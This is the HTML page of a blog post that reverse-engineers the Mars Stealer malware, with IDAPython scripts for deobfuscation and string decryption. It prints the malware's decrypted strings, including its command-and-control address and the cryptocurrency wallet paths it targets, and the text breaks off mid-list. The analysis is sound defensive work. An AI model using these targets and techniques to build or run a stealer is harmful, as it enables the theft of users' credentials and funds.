<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.24.0 by Michael Rose
  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>mars - mohamed ashraf</title>
<meta name="description" content="Introduction">


  <meta name="author" content="Your Name">
  
  <meta property="article:author" content="Your Name">
  


<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="mohamed ashraf">
<meta property="og:title" content="mars">
<meta property="og:url" content="https://x-junior.github.io//jekyll/Mars/">


  <meta property="og:description" content="Introduction">



  <meta property="og:image" content="https://x-junior.github.io//assets/images/bio-photo.jpg">



  <meta name="twitter:site" content="@mmistakes">
  <meta name="twitter:title" content="mars">
  <meta name="twitter:description" content="Introduction">
  <meta name="twitter:url" content="https://x-junior.github.io//jekyll/Mars/">

  
    <meta name="twitter:card" content="summary">
    
      <meta name="twitter:image" content="https://x-junior.github.io//assets/images/bio-photo.jpg">
    
  

  



  <meta property="article:published_time" content="2022-05-14T00:00:00+02:00">



  <meta property="article:modified_time" content="2022-05-14T15:05:34+02:00">



  

  


<link rel="canonical" href="https://x-junior.github.io//jekyll/Mars/">




<script type="application/ld+json">
  {
    "@context": "https://schema.org",
    
      "@type": "Person",
      "name": "Mohamed Ashraf",
      "url": "https://x-junior.github.io//",
      "sameAs": ["https://twitter.com/","https://github.com/"]
    
  }
</script>







<!-- end _includes/seo.html -->



  <link href="/feed.xml" type="application/atom+xml" rel="alternate" title="mohamed ashraf Feed">


<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">
<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single">
    <nav class="skip-links">
  <ul>
    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
  </ul>
</nav>

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
          <a class="site-logo" href="/"><img src="/assets/images/apple-touch-icon.png" alt="Custom Title"></a>
        
        <a class="site-title" href="/">
          Custom Title
          <span class="site-subtitle">Development Test Site</span>
        </a>
        <ul class="visible-links"><li class="masthead__menu-item">
              <a href="https://mmistakes.github.io/minimal-mistakes/about/">About</a>
            </li><li class="masthead__menu-item">
              <a href="/year-archive/">Posts</a>
            </li><li class="masthead__menu-item">
              <a href="/collection-archive/">Collections</a>
            </li><li class="masthead__menu-item">
              <a href="/sitemap/">Sitemap</a>
            </li><li class="masthead__menu-item">
              <a href="/">Extra Menu Item 1</a>
            </li><li class="masthead__menu-item">
              <a href="/">Extra Menu Item 2</a>
            </li><li class="masthead__menu-item">
              <a href="/">Extra Menu Item Long Title</a>
            </li></ul>
        
        <button class="search__toggle" type="button">
          <span class="visually-hidden">Toggle search</span>
          <i class="fas fa-search"></i>
        </button>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>


    <div class="initial-content">
      



<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person" class="h-card">

  
    <div class="author__avatar">
      <a href="https://x-junior.github.io//">
        <img src="/assets/images/bio-photo.jpg" alt="Your Name" itemprop="image" class="u-photo">
      </a>
    </div>
  

  <div class="author__content">
    <h3 class="author__name p-name" itemprop="name">
      <a class="u-url" rel="me" href="https://x-junior.github.io//" itemprop="url">Your Name</a>
    </h3>
    
      <div class="author__bio p-note" itemprop="description">
        <p>I am an <strong>amazing</strong> person.</p>

      </div>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      
        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name" class="p-locality">Somewhere</span>
        </li>
      

      
        
          
            <li><a href="https://your-site.com" rel="nofollow noopener noreferrer me"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">Your Website</span></a></li>
          
        
          
            <li><a href="https://twitter.com/" rel="nofollow noopener noreferrer me"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
          
        
          
            <li><a href="https://github.com/" rel="nofollow noopener noreferrer me"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
          
        
          
            <li><a href="https://instagram.com/" rel="nofollow noopener noreferrer me"><i class="fab fa-fw fa-instagram" aria-hidden="true"></i><span class="label">Instagram</span></a></li>
          
        
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer me">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>
  
  </div>



  <article class="page h-entry" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="mars">
    <meta itemprop="description" content="Introduction">
    <meta itemprop="datePublished" content="2022-05-14T00:00:00+02:00">
    <meta itemprop="dateModified" content="2022-05-14T15:05:34+02:00">

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title p-name" itemprop="headline">
            <a href="https://x-junior.github.io//jekyll/Mars/" class="u-url" itemprop="url">mars
</a>
          </h1>
          

  <p class="page__meta">
    

    

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-clock" aria-hidden="true"></i>
        
          20 minute read
        
      </span>
    
  </p>


        </header>
      

      <section class="page__content e-content" itemprop="text">
        
        <h1 id="introduction">Introduction</h1>

<p>Mars Stealer is an improved copy of Oski Stealer. I saw alot of tweets recently about it so i decided to write an analysis of the newer version V8. Enjoy reading!</p>
<ul>
  <li>Diffrences from the previous version:
    <ol>
      <li>anti analysis technique</li>
      <li>diffrent encryption algoithm</li>
      <li>introudcing new anti debug technique</li>
      <li>new configuration format</li>
      <li>external dlls are in one zip file</li>
    </ol>
  </li>
</ul>

<h1 id="overview">Overview</h1>

<p><img src="attachment:overview.PNG" alt="overview.PNG" /></p>

<h1 id="anti-analysis">anti-analysis</h1>

<p>Opening mars stealer in ida we can see an  anti-analysis trick called Opaque Predicates it’s a commonly used technique in program obfuscation, intended to add complexity to the control flow.</p>

<p>This obfuscation simply takes an absolute jump (JMP) and transforms it into two conditional jumps (JZ/JNZ). Depending on the value of the Zero flag (ZF), the execution will follow the first or second branch.</p>

<p>However, disassemblers are tricked into thinking that there is a fall-through branch if the second jump is not taken (which is impossible as one of them must be taken) and tries to disassemble the unreachable instructions (often invalid) resulting in garbage code.</p>

<p><img src="attachment:1.PNG" alt="1.PNG" /></p>

<p>the deobfuscation is simple, we just need to patch the first conditional jump to an absolute jump and nop out the second jump, we can use IDAPython to achieve this:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">idc</span>

<span class="n">ea</span> <span class="o">=</span> <span class="mi">0</span>
<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
    <span class="n">ea</span> <span class="o">=</span>  <span class="nb">min</span><span class="p">(</span><span class="n">ida_search</span><span class="p">.</span><span class="n">find_binary</span><span class="p">(</span><span class="n">ea</span><span class="p">,</span><span class="n">idc</span><span class="p">.</span><span class="n">BADADDR</span><span class="p">,</span> <span class="s">"74 ? 75 ?"</span><span class="p">,</span><span class="mi">16</span> <span class="p">,</span><span class="n">idc</span><span class="p">.</span><span class="n">SEARCH_NEXT</span> <span class="o">|</span> <span class="n">idc</span><span class="p">.</span><span class="n">SEARCH_DOWN</span><span class="p">),</span>  <span class="c1"># JZ / JNZ
</span>    <span class="n">ida_search</span><span class="p">.</span><span class="n">find_binary</span><span class="p">(</span><span class="n">ea</span><span class="p">,</span><span class="n">idc</span><span class="p">.</span><span class="n">BADADDR</span><span class="p">,</span> <span class="s">"75 ? 74 ?"</span><span class="p">,</span><span class="mi">16</span><span class="p">,</span> <span class="n">idc</span><span class="p">.</span><span class="n">SEARCH_NEXT</span> <span class="o">|</span> <span class="n">idc</span><span class="p">.</span><span class="n">SEARCH_DOWN</span><span class="p">))</span>  <span class="c1"># JNZ / JZ
</span>    <span class="k">if</span> <span class="n">ea</span> <span class="o">==</span> <span class="n">idc</span><span class="p">.</span><span class="n">BADADDR</span><span class="p">:</span>
        <span class="k">break</span>
    <span class="n">idc</span><span class="p">.</span><span class="n">patch_byte</span><span class="p">(</span><span class="n">ea</span><span class="p">,</span> <span class="mh">0xEB</span><span class="p">)</span>
    <span class="n">idc</span><span class="p">.</span><span class="n">patch_byte</span><span class="p">(</span><span class="n">ea</span><span class="o">+</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">)</span>
    <span class="n">idc</span><span class="p">.</span><span class="n">patch_byte</span><span class="p">(</span><span class="n">ea</span><span class="o">+</span><span class="mi">3</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">)</span>
    <span class="n">idc</span><span class="p">.</span><span class="n">patch_byte</span><span class="p">(</span><span class="n">ea</span><span class="o">+</span><span class="mi">4</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">)</span>
</code></pre></div></div>

<p><img src="attachment:2.PNG" alt="2.PNG" /></p>

<p>now we can see a clear view
<img src="attachment:3-3.PNG" alt="3-3.PNG" /></p>

<p>after reversing and renaming
<img src="attachment:3-2-3.PNG" alt="3-2-3.PNG" /></p>

<p>First Mars get a handle to kernel32.dll by parsing <code class="language-plaintext highlighter-rouge">InLoadOrderModuleList</code> then it passes the handle to a fucntion that  loops over the exported functions of the DLL to get the address of the <code class="language-plaintext highlighter-rouge">LocalAlloc()</code> and <code class="language-plaintext highlighter-rouge">VirtualProtect()</code> functions.
<img src="attachment:4.PNG" alt="4.PNG" /></p>

<p>After that it decrypts some strings used for some checks , the decryption is simple a xor function</p>

<p><img src="attachment:6.PNG" alt="6.PNG" /></p>

<p><img src="attachment:5.PNG" alt="5.PNG" /></p>

<p>We can although see that the xor function is refrenced in another function which i renamed as Decrypt_String_2 if the malware passes the checks which we will see soon it decrypt those string which contanis strings needed for the malware to steal sensitive data .
<img src="attachment:8.PNG" alt="8.PNG" /></p>

<p>We use idapython script to get those strings and rename the variables to make reversing easier
<img src="attachment:7.PNG" alt="7.PNG" /></p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">string</span>

<span class="k">def</span> <span class="nf">sanitize_string</span><span class="p">(</span><span class="n">name</span><span class="p">):</span>
        <span class="k">return</span> <span class="s">""</span><span class="p">.</span><span class="n">join</span><span class="p">([</span><span class="n">c</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">name</span> <span class="k">if</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">string</span><span class="p">.</span><span class="n">ascii_letters</span><span class="p">])[:</span><span class="mi">20</span><span class="p">].</span><span class="n">capitalize</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">X0r</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">length</span><span class="p">):</span>
    <span class="n">res</span> <span class="o">=</span> <span class="s">""</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">length</span><span class="p">):</span>
        <span class="n">res</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">key</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
    <span class="k">return</span> <span class="n">res</span>


<span class="n">start_Addrs</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x00401770</span><span class="p">,</span><span class="mh">0x00401990</span>  <span class="p">]</span>
<span class="n">end_Addrs</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x00401967</span><span class="p">,</span><span class="mh">0x0405444</span> <span class="p">]</span>

<span class="n">string_list</span> <span class="o">=</span> <span class="p">[]</span>
<span class="n">dectypred_data</span> <span class="o">=</span> <span class="sa">b</span><span class="s">''</span>
<span class="n">addrs</span> <span class="o">=</span> <span class="p">[]</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">start_Addrs</span><span class="p">)):</span>
    <span class="n">ea</span> <span class="o">=</span> <span class="n">start_Addrs</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
    <span class="n">end</span> <span class="o">=</span> <span class="n">end_Addrs</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>

    <span class="k">while</span> <span class="n">ea</span> <span class="o">&lt;=</span> <span class="n">end</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">idc</span><span class="p">.</span><span class="n">get_operand_type</span><span class="p">(</span><span class="n">ea</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="n">idc</span><span class="p">.</span><span class="n">o_imm</span><span class="p">:</span>
            <span class="n">addrs</span><span class="p">.</span><span class="n">append</span><span class="p">((</span><span class="n">idc</span><span class="p">.</span><span class="n">get_operand_value</span><span class="p">(</span><span class="n">ea</span><span class="p">,</span> <span class="mi">0</span><span class="p">)))</span>

        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">addrs</span><span class="p">)</span> <span class="o">==</span> <span class="mi">3</span><span class="p">:</span>
            <span class="n">length</span> <span class="o">=</span> <span class="n">addrs</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
            <span class="n">data</span> <span class="o">=</span> <span class="n">idc</span><span class="p">.</span><span class="n">get_bytes</span><span class="p">(</span><span class="n">addrs</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">length</span><span class="p">)</span>
            <span class="n">key</span> <span class="o">=</span> <span class="n">idc</span><span class="p">.</span><span class="n">get_bytes</span><span class="p">(</span><span class="n">addrs</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="n">length</span><span class="p">)</span>
            <span class="n">dectypred_data</span> <span class="o">=</span> <span class="n">X0r</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">length</span><span class="p">)</span>
            <span class="n">string_list</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">dectypred_data</span><span class="p">)</span>
            <span class="n">addrs</span> <span class="o">=</span> <span class="p">[]</span>

        <span class="k">if</span> <span class="n">idc</span><span class="p">.</span><span class="n">print_insn_mnem</span><span class="p">(</span><span class="n">ea</span><span class="p">)</span> <span class="o">==</span> <span class="s">"call"</span><span class="p">:</span>
            <span class="n">idc</span><span class="p">.</span><span class="n">set_cmt</span><span class="p">(</span><span class="n">ea</span><span class="p">,</span> <span class="n">dectypred_data</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>

        <span class="k">if</span> <span class="n">idc</span><span class="p">.</span><span class="n">print_insn_mnem</span><span class="p">(</span><span class="n">ea</span><span class="p">)</span> <span class="o">==</span> <span class="s">"mov"</span> <span class="ow">and</span> <span class="p">(</span><span class="n">idc</span><span class="p">.</span><span class="n">get_operand_type</span><span class="p">(</span><span class="n">ea</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="n">idc</span><span class="p">.</span><span class="n">o_mem</span><span class="p">)</span> <span class="ow">and</span> <span class="p">(</span>
                <span class="n">idc</span><span class="p">.</span><span class="n">get_operand_type</span><span class="p">(</span><span class="n">ea</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span> <span class="o">==</span> <span class="n">idc</span><span class="p">.</span><span class="n">o_reg</span><span class="p">):</span>
            <span class="n">global_var</span> <span class="o">=</span> <span class="n">idc</span><span class="p">.</span><span class="n">get_operand_value</span><span class="p">(</span><span class="n">ea</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
            <span class="n">idc</span><span class="p">.</span><span class="n">set_name</span><span class="p">(</span><span class="n">global_var</span><span class="p">,</span> <span class="s">"Str"</span> <span class="o">+</span> <span class="n">sanitize_string</span><span class="p">(</span><span class="n">dectypred_data</span><span class="p">),</span> <span class="n">SN_NOWARN</span><span class="p">)</span>

        <span class="n">ea</span> <span class="o">=</span> <span class="n">idc</span><span class="p">.</span><span class="n">next_head</span><span class="p">(</span><span class="n">ea</span><span class="p">,</span> <span class="n">end</span><span class="p">)</span>

<span class="k">print</span><span class="p">(</span><span class="n">string_list</span><span class="p">)</span>


</code></pre></div></div>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Decrypted_Strings</span> <span class="o">=</span> <span class="p">[</span><span class="s">'LoadLibraryA'</span><span class="p">,</span> <span class="s">'GetProcAddress'</span><span class="p">,</span> <span class="s">'ExitProcess'</span><span class="p">,</span> <span class="s">'advapi32.dll'</span><span class="p">,</span> <span class="s">'crypt32.dll'</span><span class="p">,</span> <span class="s">'GetTickCount'</span><span class="p">,</span> <span class="s">'Sleep'</span><span class="p">,</span> <span class="s">'GetUserDefaultLangID'</span><span class="p">,</span> <span class="s">'CreateMutexA'</span><span class="p">,</span> <span class="s">'GetLastError'</span><span class="p">,</span> <span class="s">'HeapAlloc'</span><span class="p">,</span> <span class="s">'GetProcessHeap'</span><span class="p">,</span> <span class="s">'GetComputerNameA'</span><span class="p">,</span> <span class="s">'VirtualProtect'</span><span class="p">,</span> <span class="s">'GetCurrentProcess'</span><span class="p">,</span> <span class="s">'VirtualAllocExNuma'</span><span class="p">,</span> <span class="s">'GetUserNameA'</span><span class="p">,</span> <span class="s">'CryptStringToBinaryA'</span><span class="p">,</span> <span class="s">'HAL9TH'</span><span class="p">,</span> <span class="s">'JohnDoe'</span><span class="p">,</span> <span class="s">'</span><span class="se">\xad</span><span class="s">6Ê§È/2022 20:00:00'</span><span class="p">,</span> <span class="s">'http://'</span><span class="p">,</span> <span class="s">'194.87.218.39'</span><span class="p">,</span> <span class="s">'92550737836278980100'</span><span class="p">,</span> <span class="s">'/RyC66VfSGP.php'</span><span class="p">,</span> <span class="s">'Default'</span><span class="p">,</span> <span class="s">'%hu/%hu/%hu %hu:%hu:%hu'</span><span class="p">,</span> <span class="s">'open'</span><span class="p">,</span> <span class="s">'sqlite3.dll'</span><span class="p">,</span> <span class="s">'C:</span><span class="se">\\</span><span class="s">ProgramData</span><span class="se">\\</span><span class="s">sqlite3.dll'</span><span class="p">,</span> <span class="s">'freebl3.dll'</span><span class="p">,</span> <span class="s">'C:</span><span class="se">\\</span><span class="s">ProgramData</span><span class="se">\\</span><span class="s">freebl3.dll'</span><span class="p">,</span> <span class="s">'mozglue.dll'</span><span class="p">,</span> <span class="s">'C:</span><span class="se">\\</span><span class="s">ProgramData</span><span class="se">\\</span><span class="s">mozglue.dll'</span><span class="p">,</span> <span class="s">'msvcp140.dll'</span><span class="p">,</span> <span class="s">'C:</span><span class="se">\\</span><span class="s">ProgramData</span><span class="se">\\</span><span class="s">msvcp140.dll'</span><span class="p">,</span> <span class="s">'nss3.dll'</span><span class="p">,</span> <span class="s">'C:</span><span class="se">\\</span><span class="s">ProgramData</span><span class="se">\\</span><span class="s">nss3.dll'</span><span class="p">,</span> <span class="s">'softokn3.dll'</span><span class="p">,</span> <span class="s">'C:</span><span class="se">\\</span><span class="s">ProgramData</span><span class="se">\\</span><span class="s">softokn3.dll'</span><span class="p">,</span> <span class="s">'vcruntime140.dll'</span><span class="p">,</span> <span class="s">'C:</span><span class="se">\\</span><span class="s">ProgramData</span><span class="se">\\</span><span class="s">vcruntime140.dll'</span><span class="p">,</span> <span class="s">'.zip'</span><span class="p">,</span> <span class="s">'Tag: '</span><span class="p">,</span> <span class="s">'IP: IP?'</span><span class="p">,</span> <span class="s">'Country: Country?'</span><span class="p">,</span> <span class="s">'Working Path: '</span><span class="p">,</span> <span class="s">'Local Time: '</span><span class="p">,</span> <span class="s">'TimeZone: '</span><span class="p">,</span> <span class="s">'Display Language: '</span><span class="p">,</span> <span class="s">'Keyboard Languages: '</span><span class="p">,</span> <span class="s">'Is Laptop: '</span><span class="p">,</span> <span class="s">'Processor: '</span><span class="p">,</span> <span class="s">'Installed RAM: '</span><span class="p">,</span> <span class="s">'OS: '</span><span class="p">,</span> <span class="s">' ('</span><span class="p">,</span> <span class="s">' Bit)'</span><span class="p">,</span> <span class="s">'Videocard: '</span><span class="p">,</span> <span class="s">'Display Resolution: '</span><span class="p">,</span> <span class="s">'PC name: '</span><span class="p">,</span> <span class="s">'User name: '</span><span class="p">,</span> <span class="s">'Domain name: '</span><span class="p">,</span> <span class="s">'MachineID: '</span><span class="p">,</span> <span class="s">'GUID: '</span><span class="p">,</span> <span class="s">'Installed Software: '</span><span class="p">,</span> <span class="s">'system.txt'</span><span class="p">,</span> <span class="s">'Grabber</span><span class="se">\\</span><span class="s">%s.zip'</span><span class="p">,</span> <span class="s">'%APPDATA%'</span><span class="p">,</span> <span class="s">'%LOCALAPPDATA%'</span><span class="p">,</span> <span class="s">'%USERPROFILE%'</span><span class="p">,</span> <span class="s">'%DESKTOP%'</span><span class="p">,</span> <span class="s">'Wallets</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> <span class="s">'Ethereum'</span><span class="p">,</span> <span class="s">'</span><span class="se">\\</span><span class="s">Ethereum</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> <span class="s">'keystore'</span><span class="p">,</span> <span class="s">'Electrum'</span><span class="p">,</span> <span class="s">'</span><span class="se">\\</span><span class="s">Electrum</span><span class="se">\\</span><span class="s">wallets</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> <span class="s">'*.*'</span><span class="p">,</span> <span class="s">'ElectrumLTC'</span><span class="p">,</span> <span class="s">'</span><span class="se">\\</span><span class="s">Electrum-LTC</span><span class="se">\\</span><span class="s">wallets</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> <span class="s">'Exodus'</span><span class="p">,</span> <span class="s">'</span><span class="se">\\</span><span class="s">Exodus</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> <span class="s">'exodus.conf.json'</span><span class="p">,</span> <span class="s">'window-state.json'</span><span class="p">,</span> <span class="s">'</span><span class="se">\\</span><span class="s">Exodus</span><span class="se">\\</span><span class="s">exodus.wallet</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> <span class="s">'passphrase.json'</span><span class="p">,</span> <span class="s">'seed.seco'</span><span class="p">,</span> <span class="s">'info.seco'</span><span class="p">,</span> <span class="s">'ElectronCash'</span><span class="p">,</span> <span class="s">'</span><span class="se">\\</span><span class="s">ElectronCash</span><span class="se">\\</span><span class="s">wallets</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> <span class="s">'default_wallet'</span><span class="p">,</span> <span class="s">'MultiDoge'</span><span class="p">,</span> <span class="s">'</span><span class="se">\\</span><span class="s">MultiDoge</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> <span class="s">'multidoge.wallet'</span><span class="p">,</span> <span class="s">'JAXX'</span><span class="p">,</span> <span class="s">'</span><span class="se">\\</span><span class="s">jaxx</span><span class="se">\\</span><span class="s">Local Storage</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> <span class="s">'file__0.localstorage'</span><span class="p">,</span> <span class="s">'Atomic'</span><span class="p">,</span> <span class="s">'</span><span class="se">\\</span><span class="s">atomic</span><span class="se">\\</span><span class="s">Local Storage</span><span class="se">\\</span><span class="s">leveldb</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> <span class="s">'000003.log'</span><span class="p">,</span> <span class="s">'CURRENT'</span><span class="p">,</span> <span class="s">'LOCK'</span><span class="p">,</span> <span class="s">'LOG'</span><span class="p">,</span> <span class="s">'MANIFEST-000001'</span><span class="p">,</span> <span class="s">'0000*'</span><span class="p">,</span> <span class="s">'Binance'</span><span class="p">,</span> <span class="s">'</span><span class="se">\\</span><span class="s">Binance</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> <span class="s">'app-store.json'</span><span class="p">,</span> <span class="s">'Coinomi'</span><span class="p">,</span> <span class="s">'</span><span class="se">\\</span><span class="s">Coinomi</span><span class="se">\\</span><span class="s">Coinomi</span><span class="se">\\</span><span class="s">wallets</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> <span class="s">'*.wallet'</span><span class="p">,</span> <span class="s">'*.config'</span><span class="p">,</span> <span class="s">'*wallet*.dat'</span><span class="p">,</span> <span class="s">'GetSystemTime'</span><span class="p">,</span> <span class="s">'lstrcatA'</span><span class="p">,</span> <span class="s">'SystemTimeToFileTime'</span><span class="p">,</span> <span class="s">'ntdll.dll'</span><span class="p">,</span> <span class="s">'sscanf'</span><span class="p">,</span> <span class="s">'memset'</span><span class="p">,</span> <span class="s">'memcpy'</span><span class="p">,</span> <span class="s">'wininet.dll'</span><span class="p">,</span> <span class="s">'user32.dll'</span><span class="p">,</span> <span class="s">'gdi32.dll'</span><span class="p">,</span> <span class="s">'netapi32.dll'</span><span class="p">,</span> <span class="s">'psapi.dll'</span><span class="p">,</span> <span class="s">'bcrypt.dll'</span><span class="p">,</span> <span class="s">'vaultcli.dll'</span><span class="p">,</span> <span class="s">'shlwapi.dll'</span><span class="p">,</span> <span class="s">'shell32.dll'</span><span class="p">,</span> <span class="s">'gdiplus.dll'</span><span class="p">,</span> <span class="s">'ole32.dll'</span><span class="p">,</span> <span class="s">'dbghelp.dll'</span><span class="p">,</span> <span class="s">'CreateFileA'</span><span class="p">,</span> <span class="s">'WriteFile'</span><span class="p">,</span> <span class="s">'CloseHandle'</span><span class="p">,</span> <span class="s">'GetFileSize'</span><span class="p">,</span> <span class="s">'lstrlenA'</span><span class="p">,</span> <span class="s">'LocalAlloc'</span><span class="p">,</span> <span class="s">'GlobalFree'</span><span class="p">,</span> <span class="s">'ReadFile'</span><span class="p">,</span> <span class="s">'OpenProcess'</span><span class="p">,</span> <span class="s">'SetFilePointer'</span><span class="p">,</span> <span class="s">'SetEndOfFile'</span><span class="p">,</span> <span class="s">'GetCurrentProcessId'</span><span class="p">,</span> <span class="s">'GetLocalTime'</span><span class="p">,</span> <span class="s">'GetTimeZoneInformation'</span><span class="p">,</span> <span class="s">'GetUserDefaultLocaleName'</span><span class="p">,</span> <span class="s">'LocalFree'</span><span class="p">,</span> <span class="s">'GetSystemPowerStatus'</span><span class="p">,</span> <span class="s">'GetSystemInfo'</span><span class="p">,</span> <span class="s">'GlobalMemoryStatusEx'</span><span class="p">,</span> <span class="s">'IsWow64Process'</span><span class="p">,</span> <span class="s">'GetTempPathA'</span><span class="p">,</span> <span class="s">'GetLocaleInfoA'</span><span class="p">,</span> <span class="s">'GetFileSizeEx'</span><span class="p">,</span> <span class="s">'GetFileAttributesA'</span><span class="p">,</span> <span class="s">'FindFirstFileA'</span><span class="p">,</span> <span class="s">'FindNextFileA'</span><span class="p">,</span> <span class="s">'FindClose'</span><span class="p">,</span> <span class="s">'GetCurrentDirectoryA'</span><span class="p">,</span> <span class="s">'CopyFileA'</span><span class="p">,</span> <span class="s">'DeleteFileA'</span><span class="p">,</span> <span class="s">'lstrcmpW'</span><span class="p">,</span> <span class="s">'GlobalAlloc'</span><span class="p">,</span> <span class="s">'FreeLibrary'</span><span class="p">,</span> <span class="s">'SetCurrentDirectoryA'</span><span class="p">,</span> <span class="s">'CreateFileMappingA'</span><span class="p">,</span> <span class="s">'MapViewOfFile'</span><span class="p">,</span> <span class="s">'UnmapViewOfFile'</span><span class="p">,</span> <span class="s">'FileTimeToSystemTime'</span><span class="p">,</span> <span class="s">'GetFileInformationByHandle'</span><span class="p">,</span> <span class="s">'GlobalLock'</span><span class="p">,</span> <span class="s">'GlobalSize'</span><span class="p">,</span> <span class="s">'WideCharToMultiByte'</span><span class="p">,</span> <span class="s">'GetWindowsDirectoryA'</span><span class="p">,</span> <span class="s">'GetVolumeInformationA'</span><span class="p">,</span> <span class="s">'GetVersionExA'</span><span class="p">,</span> <span class="s">'GetModuleFileNameA'</span><span class="p">,</span> <span class="s">'CreateFileW'</span><span class="p">,</span> <span class="s">'CreateFileMappingW'</span><span class="p">,</span> <span class="s">'MultiByteToWideChar'</span><span class="p">,</span> <span class="s">'CreateThread'</span><span class="p">,</span> <span class="s">'GetEnvironmentVariableA'</span><span class="p">,</span> <span class="s">'SetEnvironmentVariableA'</span><span class="p">,</span> <span class="s">'lstrcpyA'</span><span class="p">,</span> <span class="s">'lstrcpynA'</span><span class="p">,</span> <span class="s">'InternetOpenA'</span><span class="p">,</span> <span class="s">'InternetConnectA'</span><span class="p">,</span> <span class="s">'HttpOpenRequestA'</span><span class="p">,</span> <span 